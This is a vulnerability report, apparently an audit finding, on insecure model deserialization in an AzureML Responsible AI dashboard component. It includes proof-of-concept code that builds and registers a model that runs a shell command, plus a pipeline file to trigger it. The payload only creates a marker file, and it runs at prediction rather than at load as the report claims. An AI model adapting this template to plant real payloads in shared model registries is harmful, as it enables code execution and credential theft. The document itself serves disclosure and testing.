- Vulnerability Name: Insecure Deserialization in RAI Insights Dashboard Constructor
- Description:
    1. An attacker can craft a malicious MLflow model.
    2. The attacker registers this model in AzureML Model Registry.
    3. The attacker then triggers a Responsible AI Dashboard pipeline job, providing the malicious model's ID as `model_id` input to the `rai_insights_constructor` component.
    4. The `rai_insights_constructor` component uses `mlflow.pyfunc.load_model` to load the registered model.
    5. If the malicious model contains serialized malicious payloads, these payloads will be deserialized during model loading.
    6. This deserialization can lead to arbitrary code execution on the compute instance running the RAI dashboard pipeline.
- Impact:
    - Critical: Arbitrary code execution on the AzureML compute instance. This could allow the attacker to steal credentials, access sensitive data, or further compromise the AzureML workspace and associated resources.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None: The project relies on MLflow's model loading mechanism without additional security measures.
- Missing Mitigations:
    - Input validation: The `rai_insights_constructor` component should validate the model ID and potentially the model source before attempting to load it, to ensure it comes from a trusted source.
    - Sandboxing or isolation: The model loading and RAI computation process should be sandboxed or isolated to limit the impact of potential code execution vulnerabilities. Using secure deserialization practices or avoiding deserialization of untrusted data altogether would also mitigate this.
- Preconditions:
    - The attacker needs to be able to register a malicious model in the AzureML Model Registry. This might be possible if the attacker has contributor access to the workspace or if there are vulnerabilities in the model registration process itself (though not directly part of this project's code).
    - The user needs to trigger a Responsible AI Dashboard pipeline job using the attacker-controlled model ID.
- Source Code Analysis:
    - File: `/code/src/responsibleai/rai_analyse/create_rai_insights.py`
    - Step 1: The `create_rai_insights.py` script is the entry point for the `rai_insights_constructor` component.
    - Step 2: The script parses arguments, including `model_info_path`, `model_input`, and `model_info`. It prioritizes `model_info_path` and uses `fetch_model_id` and `load_mlflow_model` to load the model.
    - Step 3: `load_mlflow_model` function (defined in `/code/src/responsibleai/rai_analyse/rai_component_utilities.py`) uses `mlflow.pyfunc.load_model(model_uri)` to load the model.
    - Step 4: `mlflow.pyfunc.load_model` in MLflow is known to be vulnerable to insecure deserialization if the loaded model contains malicious serialized objects.
    - Visualization:
        ```
        User Input (Malicious Model ID) --> rai_insights_constructor component --> create_rai_insights.py --> load_mlflow_model --> mlflow.pyfunc.load_model (Vulnerable Deserialization) --> Code Execution
        ```
- Security Test Case:
    1. **Attacker creates a malicious model:**
        ```python
        import mlflow.pyfunc
        import pickle
        import os

        class MaliciousModel(object):
            def predict(self, data):
                os.system('touch /tmp/pwned') # Malicious command
                return [0] * len(data)

        # Create malicious payload
        malicious_code = MaliciousModel()

        # Save malicious model
        mlflow.pyfunc.save_model(
            path="malicious_model",
            python_model=malicious_code,
            serialization_format=mlflow.pyfunc.SERIALIZATION_FORMAT_PICKLE
        )
        ```
    2. **Attacker registers the malicious model in AzureML Model Registry** (using AzureML SDK or CLI, assuming attacker has access):
        ```python
        from azure.ai.ml import MLClient
        from azure.ai.ml.entities import Model
        from azure.identity import DefaultAzureCredential

        ml_client = MLClient.from_config(credential=DefaultAzureCredential())

        model_name = "malicious-rai-model"
        model_version = "1"

        malicious_model_asset = Model(
            path="malicious_model",
            type="mlflow_model",
            name=model_name,
            version=model_version,
            description="Malicious RAI Model"
        )
        registered_model = ml_client.models.create_or_update(malicious_model_asset)

        print(f"Registered model {registered_model.name}:{registered_model.version}")
        malicious_model_id = f"{registered_model.name}:{registered_model.version}"
        ```
    3. **User creates and submits a Responsible AI Dashboard pipeline job**, replacing `<MALICIOUS_MODEL_ID>` with the ID from the previous step in `pipeline.yaml`:
        ```yaml
        $schema: https://azuremlschemas.azureedge.net/latest/pipelineJob.schema.json
        experiment_name: RAI_Insecure_Deserialization_Test
        type: pipeline
        inputs:
          target_column_name: income
          my_training_data:
            type: mltable
            path: azureml:adult_train:1
            mode: download
          my_test_data:
            type: mltable
            path: azureml:adult_test:1
            mode: download
        settings:
          default_datastore: azureml:workspaceblobstore
          default_compute: azureml:cpucluster
          continue_on_step_failure: false
        jobs:
          create_rai_job:
            type: command
            component: azureml:rai_insights_constructor:1
            inputs:
              title: Insecure Deserialization Test
              task_type: classification
              model_info: <MALICIOUS_MODEL_ID> # Replace with malicious model ID
              train_dataset: ${{parent.inputs.my_training_data}}
              test_dataset: ${{parent.inputs.my_test_data}}
              target_column_name: ${{parent.inputs.target_column_name}}
              categorical_column_names: '["Race", "Sex", "Workclass", "Marital Status", "Country", "Occupation"]'
          gather_01:
            type: command
            component: azureml:rai_insights_gather:1
            inputs:
              constructor: ${{parent.jobs.create_rai_job.outputs.rai_insights_dashboard}}
        ```
    4. **Submit the pipeline job** using AzureML CLI: `az ml job create --file pipeline.yaml`
    5. **Verify code execution:** After the pipeline job completes (or even fails during the `rai_insights_constructor` step), check the compute instance or the logs for evidence of code execution. In this example, check if the `/tmp/pwned` file exists on the compute instance. If it does, the vulnerability is confirmed. You could also observe other malicious activities depending on the payload, like exfiltration of data or credential theft.